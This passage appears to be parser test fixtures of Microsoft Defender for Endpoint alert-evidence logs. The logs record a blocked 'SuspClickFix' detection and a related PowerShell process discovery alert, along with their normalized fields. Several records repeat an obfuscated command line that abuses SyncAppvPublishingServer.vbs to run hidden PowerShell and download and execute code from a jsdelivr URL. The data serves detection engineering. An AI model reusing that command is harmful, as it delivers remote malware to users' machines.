\\\"2026-01-13T09:30:47.7219848Z\\\"}], \\\"LastVerdict\\\": \\\"Suspicious\\\", \\\"Asset\\\": true, \\\"DetailedRoles\\\": [\\\"PrimaryDevice\\\"], \\\"RbacScopes\\\": {\\\"ScopesPerType\\\": {\\\"MachineGroupIds\\\": {\\\"Mode\\\": \\\"Any\\\", \\\"Scopes\\\": [\\\"9713\\\"]}, \\\"Workloads\\\": {\\\"Mode\\\": \\\"All\\\", \\\"Scopes\\\": [\\\"Mdatp\\\"]}}}, \\\"Type\\\": \\\"host\\\", \\\"LeadingHost\\\": true, \\\"Role\\\": 0, \\\"MachineId\\\": \\\"11111111111111111111111111111111111111111111\\\", \\\"MachineIdType\\\": 3, \\\"HostMachineId\\\": null, \\\"DetectionStatus\\\": \\\"Detected\\\", \\\"SuspicionLevel\\\": \\\"Suspicious\\\", \\\"IsIoc\\\": false, \\\"MergeByKey\\\": \\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\", \\\"MergeByKeyHex\\\": \\\"0000000000000000000000000000000000000000\\\"}, \\\"SizeInBytes\\\": 450560, \\\"FileHashes\\\": [{\\\"$id\\\": \\\"4\\\", \\\"Algorithm\\\": \\\"SHA1\\\", \\\"Value\\\": \\\"1111111111111111111111111111111111111111\\\", \\\"Type\\\": \\\"filehash\\\"}, {\\\"$id\\\": \\\"5\\\", \\\"Algorithm\\\": \\\"MD5\\\", \\\"Value\\\": \\\"11111111111111111111111111111111\\\", \\\"Type\\\": \\\"filehash\\\"}, {\\\"$id\\\": \\\"6\\\", \\\"Algorithm\\\": \\\"SHA256\\\", \\\"Value\\\": \\\"1111111111111111111111111111111111111111111111111111111111111111\\\", \\\"Type\\\": \\\"filehash\\\"}], \\\"CreatedTimeUtc\\\": \\\"2025-05-06T10:55:05.9989932Z\\\", \\\"Type\\\": \\\"file\\\", \\\"LsHash\\\": \\\"efebfebfdbda595eaf99b55b9b99ba5b9f6766b95fb5b5deff7bf66f9f56a65fe57f9fd56abb5fb5a59f9d96fa6fffa9699e5fa5a5aeafb7b55f5bda695f6b66\\\", \\\"IsPe\\\": true, \\\"LastAccessTimeUtc\\\": \\\"2026-01-13T09:28:15.7106403Z\\\", \\\"LastWriteTimeUtc\\\": \\\"2025-05-06T10:55:06.0110638Z\\\", \\\"Publisher\\\": \\\"Microsoft Corporation\\\", \\\"KnownPrevalence\\\": 75602, \\\"FirstSeen\\\": \\\"2024-08-28T11:59:36.6635016\\\"}, \\\"Account\\\": {\\\"$id\\\": \\\"7\\\", \\\"Name\\\": \\\"JohnDoe\\\", \\\"NTDomain\\\": \\\"EXAMPLE.local\\\", \\\"UPNSuffix\\\": \\\"example.com\\\", \\\"Host\\\": {\\\"$ref\\\": \\\"3\\\"}, \\\"Sid\\\": \\\"S-1-5-21-111111111-111111111-111111111-1111\\\", \\\"AadUserId\\\": \\\"22222222-2222-2222-2222-222222222222\\\", \\\"IsDomainJoined\\\": true, \\\"DisplayName\\\": \\\"John Doe\\\", \\\"RemediationProviders\\\": [{\\\"RemediationState\\\": \\\"Active\\\", \\\"RemediationDate\\\": \\\"2026-01-13T09:30:47.7219848Z\\\", \\\"Type\\\": \\\"remediation-provider\\\"}], \\\"LastRemediationState\\\": \\\"Active\\\", \\\"ThreatAnalysisSummary\\\": [{\\\"AnalyzersResult\\\": [], \\\"Verdict\\\": \\\"Suspicious\\\", \\\"AnalysisDate\\\": \\\"2026-01-13T09:30:47.7219848Z\\\"}], \\\"LastVerdict\\\": \\\"Suspicious\\\", \\\"Asset\\\": true, \\\"RbacScopes\\\": {\\\"ScopesPerType\\\": {\\\"MachineGroupIds\\\": {\\\"Mode\\\": \\\"Any\\\", \\\"Scopes\\\": [\\\"9713\\\"]}, \\\"Workloads\\\": {\\\"Mode\\\": \\\"All\\\", \\\"Scopes\\\": [\\\"Mdatp\\\"]}}}, \\\"Type\\\": \\\"account\\\", \\\"UserPrincipalName\\\": \\\"john.doe@example.com\\\", \\\"Role\\\": 0, \\\"ReferenceId\\\": \\\"33333333-3333-3333-3333-333333333333:111111111111\\\", \\\"DetectionStatus\\\": \\\"Detected\\\", \\\"SuspicionLevel\\\": \\\"Suspicious\\\", \\\"IsIoc\\\": true, \\\"MergeByKey\\\": \\\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\\\", \\\"MergeByKeyHex\\\": \\\"1111111111111111111111111111111111111111\\\"}, \\\"ParentProcess\\\": {\\\"$id\\\": \\\"8\\\", \\\"ProcessId\\\": \\\"20804\\\", \\\"CommandLine\\\": \\\"\\\\\\\"WScript.exe\\\\\\\" \\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\SyncAppvPublishingServer.vbs\\\\\\\" \\\\\\\"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\\\\\\\"\\\", \\\"CreationTimeUtc\\\": \\\"2026-01-13T09:28:14.8898935Z\\\", \\\"ImageFile\\\": {\\\"$id\\\": \\\"9\\\", \\\"Directory\\\": \\\"C:\\\\\\\\Windows\\\\\\\\System32\\\", \\\"Name\\\": \\\"wscript.exe\\\", \\\"Host\\\": {\\\"$ref\\\": \\\"3\\\"}, \\\"SizeInBytes\\\": 200704, \\\"FileHashes\\\": [{\\\"$id\\\": \\\"10\\\", \\\"Algorithm\\\": \\\"SHA1\\\", \\\"Value\\\": \\\"2222222222222222222222222222222222222222\\\", \\\"Type\\\": \\\"filehash\\\"}, {\\\"$id\\\": \\\"11\\\", \\\"Algorithm\\\": \\\"MD5\\\", \\\"Value\\\": \\\"22222222222222222222222222222222\\\", \\\"Type\\\": \\\"filehash\\\"}, {\\\"$id\\\": \\\"12\\\", \\\"Algorithm\\\": \\\"SHA256\\\", \\\"Value\\\": \\\"2222222222222222222222222222222222222222222222222222222222222222\\\", \\\"Type\\\": \\\"filehash\\\"}], \\\"CreatedTimeUtc\\\": \\\"2025-10-20T09:07:56.1413983Z\\\", \\\"Type\\\": \\\"file\\\", \\\"LsHash\\\": \\\"bfd9fa7f5bdd59697bd9b967efdaf556df576ae96eb675e97fb6e67e6d55665df57a5bd9feb7de95e6f9ee99aaaebf95b9ef9f95bdefbbe7b59aaaddb5ee7ba6\\\", \\\"IsPe\\\": true, \\\"LastAccessTimeUtc\\\": \\\"2026-01-13T09:28:15.01559Z\\\", \\\"LastWriteTimeUtc\\\": \\\"2025-10-20T09:07:56.1570612Z\\\", \\\"Publisher\\\": \\\"Microsoft Corporation\\\", \\\"KnownPrevalence\\\": 68403, \\\"FirstSeen\\\": \\\"2025-09-16T23:21:11.9487847\\\"}, \\\"Account\\\": {\\\"$ref\\\": \\\"7\\\"}, \\\"Host\\\": {\\\"$ref\\\": \\\"3\\\"}, \\\"CreatedTimeUtc\\\": \\\"2026-01-13T09:28:14.8898935Z\\\", \\\"Type\\\": \\\"process\\\"}, \\\"Host\\\": {\\\"$ref\\\": \\\"3\\\"}, \\\"CreatedTimeUtc\\\": \\\"2026-01-13T09:28:15.5061072Z\\\", \\\"RemediationProviders\\\": [{\\\"RemediationState\\\": \\\"Blocked\\\", \\\"RemediationDate\\\": \\\"2026-01-13T09:28:16.3142113Z\\\", \\\"Type\\\": \\\"remediation-provider\\\"}], \\\"LastRemediationState\\\": \\\"Blocked\\\", \\\"ThreatAnalysisSummary\\\": [{\\\"AnalyzersResult\\\": [], \\\"Verdict\\\": \\\"Malicious\\\", \\\"AnalysisDate\\\": \\\"2026-01-13T09:28:15.841366Z\\\"}], \\\"LastVerdict\\\": \\\"Malicious\\\", \\\"RbacScopes\\\": {\\\"ScopesPerType\\\": {\\\"MachineGroupIds\\\": {\\\"Mode\\\": \\\"Any\\\", \\\"Scopes\\\": [\\\"9713\\\"]}, \\\"Workloads\\\": {\\\"Mode\\\": \\\"All\\\", \\\"Scopes\\\": [\\\"Mdatp\\\"]}}}, \\\"Type\\\": \\\"process\\\", \\\"ReferenceId\\\": \\\"44444444-4444-4444-4444-444444444444:222222222222\\\", \\\"DetectionStatus\\\": \\\"Blocked\\\", \\\"ThreatFamilyName\\\": \\\"SuspClickFix\\\", \\\"SuspicionLevel\\\": \\\"Suspicious\\\", \\\"IsIoc\\\": true, \\\"Role\\\": 1, \\\"MergeByKey\\\": \\\"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=\\\", \\\"MergeByKeyHex\\\": \\\"2222222222222222222222222222222222222222\\\"}\", \"MachineGroup\": null, \"NetworkMessageId\": null, \"ServiceSource\": \"Microsoft Defender for Endpoint\", \"FileName\": \"powershell.exe\", \"FolderPath\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\", \"ProcessCommandLine\": \"\\\"powershell.exe\\\" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}\", \"EmailSubject\": null, \"ApplicationId\": null, \"Application\": null, \"DeviceName\": null, \"FileSize\": 450560, \"RegistryKey\": null, \"RegistryValueName\": null, \"RegistryValueData\": null, \"AccountUpn\": null, \"OAuthApplicationId\": null, \"Categories\": \"[\\\"SuspiciousActivity\\\"]\", \"Title\": \"Suspicious 'SuspClickFix' behavior was blocked\", \"AttackTechniques\": \"\", \"DetectionSource\": \"Antivirus\", \"Severity\": \"Low\", \"CloudResource\": null, \"CloudPlatform\": \"\", \"ResourceType\": null, \"ResourceID\": null, \"SubscriptionId\": \"\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:16.950012Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "file": {
            "directory": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
            "hash": {
                "sha1": "1111111111111111111111111111111111111111",
                "sha256": "1111111111111111111111111111111111111111111111111111111111111111"
            },
            "name": "powershell.exe",
            "size": 450560
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious 'SuspClickFix' behavior was blocked"
                },
                "entity": {
                    "type": "Process"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "detection_status": "Blocked",
                    "last_remediation_state": "Blocked",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:28:16.3142113Z",
                            "RemediationState": "Blocked",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "process": {
            "args": [
                "&{$env:psmodulepath",
                "'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}",
                "*stM*)",
                "-Command",
                "-ExecutionPolicy",
                "-NonInteractive",
                "-WindowStyle",
                "=",
                "AppvClient;",
                "Hidden",
                "RemoteSigned",
                "Sync-AppvPublishingServer",
                "[IO.Directory]::GetCurrentDirectory();",
                "i*x)(&(gcm",
                "import-module",
                "n;&(gal"
            ],
            "command_line": "\"powershell.exe\" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}",
            "name": "powershell.exe",
            "parent": {
                "command_line": "\"WScript.exe\" \"C:\\WINDOWS\\system32\\SyncAppvPublishingServer.vbs\" \"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\"",
                "pid": 20804
            },
            "pid": 16108
        },
        "related": {
            "hash": [
                "1111111111111111111111111111111111111111",
                "1111111111111111111111111111111111111111111111111111111111111111"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "Antivirus"
        }
    }
    	
	```


=== "test_alert_evidence_remediation.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-01-13T09:40:52.1607997Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2026-01-13T09:40:52.1240000Z\",\"properties\":{\"Timestamp\":\"2026-01-13T09:28:36.2236631Z\",\"AlertId\":\"11111111-1111-1111-1111-111111111111_1\",\"EntityType\":\"Process\",\"EvidenceRole\":\"Related\",\"SHA1\":\"7c04ec2377e32b3c7742f581f6c5437464dd2cf2\",\"SHA256\":\"3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8\",\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"ProcessId\\\":\\\"8988\\\",\\\"CommandLine\\\":\\\"\\\\\\\"powershell.exe\\\\\\\" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}\\\",\\\"ElevationToken\\\":\\\"Default\\\",\\\"CreationTimeUtc\\\":\\\"2026-01-13T09:28:35.2776791Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"2\\\",\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\",\\\"Name\\\":\\\"powershell.exe\\\",\\\"Host\\\":{\\\"$id\\\":\\\"3\\\",\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"hostname\\\",\\\"NetBiosName\\\":\\\"hostname.example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"11111111111111111111111111111111111111111111\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\",\\\"MergeByKeyHex\\\":\\\"0000000000000000000000000000000000000000\\\"},\\\"SizeInBytes\\\":450560,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"4\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"7c04ec2377e32b3c7742f581f6c5437464dd2cf2\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"5\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"9d8e30daf21108092d5980c931876b7e\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"6\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2025-05-06T10:55:05.9989932Z\\\",\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"efebfebfdbda595eaf99b55b9b99ba5b9f6766b95fb5b5deff7bf66f9f56a65fe57f9fd56abb5fb5a59f9d96fa6fffa9699e5fa5a5aeafb7b55f5bda695f6b66\\\",\\\"IsPe\\\":true,\\\"LastAccessTimeUtc\\\":\\\"2026-01-13T09:28:15.7106403Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2025-05-06T10:55:06.0110638Z\\\",\\\"Publisher\\\":\\\"Microsoft Corporation\\\",\\\"KnownPrevalence\\\":75602,\\\"FirstSeen\\\":\\\"2024-08-28T11:59:36.6635016\\\"},\\\"Account\\\":{\\\"$id\\\":\\\"7\\\",\\\"Name\\\":\\\"JohnDoe\\\",\\\"NTDomain\\\":\\\"EXAMPLE.local\\\",\\\"UPNSuffix\\\":\\\"example.com\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Sid\\\":\\\"S-1-5-21-111111111-111111111-111111111-1111\\\",\\\"AadUserId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"IsDomainJoined\\\":true,\\\"DisplayName\\\":\\\"John Doe\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"account\\\",\\\"UserPrincipalName\\\":\\\"john.doe@example.com\\\",\\\"Role\\\":0,\\\"ReferenceId\\\":\\\"33333333-3333-3333-3333-333333333333:111111111111\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"MergeByKey\\\":\\\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\\\",\\\"MergeByKeyHex\\\":\\\"1111111111111111111111111111111111111111\\\"},\\\"ParentProcess\\\":{\\\"$id\\\":\\\"8\\\",\\\"ProcessId\\\":\\\"25976\\\",\\\"CommandLine\\\":\\\"\\\\\\\"WScript.exe\\\\\\\" \\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\SyncAppvPublishingServer.vbs\\\\\\\" \\\\\\\"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\\\\\\\"\\\",\\\"ElevationToken\\\":\\\"Default\\\",\\\"CreationTimeUtc\\\":\\\"2026-01-13T09:28:35.0599284Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"9\\\",\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\",\\\"Name\\\":\\\"wscript.exe\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"SizeInBytes\\\":200704,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"10\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"41e72a2192e95926546eb2ba5b8b7ac85186712b\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"11\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"5de91618b84073b3d7fe534967a56fc5\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"12\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"e0c960e80e123d4cb5ce0c2337be3548a09453c69edd79d767e0d2398d011e4a\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2025-10-20T09:07:56.1413983Z\\\",\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"bfd9fa7f5bdd59697bd9b967efdaf556df576ae96eb675e97fb6e67e6d55665df57a5bd9feb7de95e6f9ee99aaaebf95b9ef9f95bdefbbe7b59aaaddb5ee7ba6\\\",\\\"IsPe\\\":true,\\\"LastAccessTimeUtc\\\":\\\"2026-01-13T09:28:15.01559Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2025-10-20T09:07:56.1570612Z\\\",\\\"Publisher\\\":\\\"Microsoft Corporation\\\",\\\"KnownPrevalence\\\":68403,\\\"FirstSeen\\\":\\\"2025-09-16T23:21:11.9487847\\\"},\\\"Account\\\":{\\\"$ref\\\":\\\"7\\\"},\\\"ParentProcess\\\":{\\\"$id\\\":\\\"13\\\",\\\"ProcessId\\\":\\\"20284\\\",\\\"CommandLine\\\":\\\"Explorer.EXE\\\",\\\"CreationTimeUtc\\\":\\\"2026-01-13T07:05:08.2477897Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"14\\\",\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\",\\\"Name\\\":\\\"explorer.exe\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"SizeInBytes\\\":5621024,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"15\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"2cc5e6bc0a3ea794b99c219eb94023849dbaf57a\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"16\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"8ff1ea4c155f04a6d6d3c29859b17e60\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"17\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"494e3c72cf7654296596975a592a69fecd76f484eb5475da179546696dcb8354\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2025-12-18T08:46:36.3363048Z\\\",\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"7fd9f66fabddaa6e7bd5aa67dfdaf555dfab6ade6ab575dd7f76766dafa5675ef66f9ae5bdf7ee66b6e99be5655f5d95b9ef9fa9beed7be6b95657d9faefabfa\\\",\\\"IsPe\\\":true,\\\"LastAccessTimeUtc\\\":\\\"2026-01-13T07:05:08.2627456Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2025-12-18T08:46:36.4892155Z\\\",\\\"Publisher\\\":\\\"Microsoft Corporation\\\",\\\"KnownPrevalence\\\":70505,\\\"FirstSeen\\\":\\\"2025-12-09T18:09:56.3005626\\\"},\\\"Account\\\":{\\\"$ref\\\":\\\"7\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2026-01-13T07:05:08.2477897Z\\\",\\\"Type\\\":\\\"process\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2026-01-13T09:28:35.0599284Z\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"process\\\",\\\"ReferenceId\\\":\\\"44444444-4444-4444-4444-444444444444:222222222222\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"Role\\\":1,\\\"MergeByKey\\\":\\\"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=\\\",\\\"MergeByKeyHex\\\":\\\"2222222222222222222222222222222222222222\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2026-01-13T09:28:35.2776791Z\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"process\\\",\\\"ReferenceId\\\":\\\"55555555-5555-5555-5555-555555555555:333333333333\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"Role\\\":1,\\\"MergeByKey\\\":\\\"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=\\\",\\\"MergeByKeyHex\\\":\\\"3333333333333333333333333333333333333333\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":\"powershell.exe\",\"FolderPath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"ProcessCommandLine\":\"\\\"powershell.exe\\\" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}\",\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":450560,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"Discovery\\\"]\",\"Title\":\"Suspicious Process Discovery\",\"AttackTechniques\":\"[\\\"Process Discovery (T1057)\\\",\\\"PowerShell (T1059.001)\\\"]\",\"DetectionSource\":\"EDR\",\"Severity\":\"Low\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:36.223663Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "file": {
            "directory": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
            "hash": {
                "sha1": "7c04ec2377e32b3c7742f581f6c5437464dd2cf2",
                "sha256": "3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8"
            },
            "name": "powershell.exe",
            "size": 450560
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious Process Discovery"
                },
                "entity": {
                    "type": "Process"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "detection_status": "Detected",
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:40:40.9701986Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "process": {
            "args": [
                "&{$env:psmodulepath",
                "'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}",
                "*stM*)",
                "-Command",
                "-ExecutionPolicy",
                "-NonInteractive",
                "-WindowStyle",
                "=",
                "AppvClient;",
                "Hidden",
                "RemoteSigned",
                "Sync-AppvPublishingServer",
                "[IO.Directory]::GetCurrentDirectory();",
                "i*x)(&(gcm",
                "import-module",
                "n;&(gal"
            ],
